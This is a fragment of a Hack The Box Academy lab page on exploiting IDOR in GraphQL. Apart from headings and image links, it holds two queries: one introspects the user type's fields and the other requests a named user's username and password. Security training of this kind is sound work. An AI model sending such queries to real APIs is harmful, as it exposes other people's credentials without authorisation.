<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/271/section/3153
// Platform Version: V1
// Module ID: 271
// Module Name: Attacking GraphQL
// Module Difficulty: Medium
// Section ID: 3153
// Section Title: Insecure Direct Object Reference (IDOR)
// Page Title: Hack The Box - Academy
// Page Number: 03
-->

# Insecure Direct Object Reference (IDOR)

**Module Name:** Attacking GraphQL **Page Number:** 03

#### 

#### ATTACKING GRAPHQL Mini-Module

# Insecure Direct Object Reference (IDOR)

## Identifying IDOR

![https://academy.hackthebox.com/storage/modules/271/idor_1.png](https://academy.hackthebox.com/storage/modules/271/idor_1.png)

![https://academy.hackthebox.com/storage/modules/271/idor_2.png](https://academy.hackthebox.com/storage/modules/271/idor_2.png)

## Exploiting IDOR

``` graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

![https://academy.hackthebox.com/storage/modules/271/idor_3.png](https://academy.hackthebox.com/storage/modules/271/idor_3.png)

``` graphql
{
  user(username: "test") {
    username
    password
  }
}
```

![https://academy.hackthebox.com/storage/modules/271/idor_4.png](https://academy.hackthebox.com/storage/modules/271/idor_4.png)

# 

# 

#### Questions

####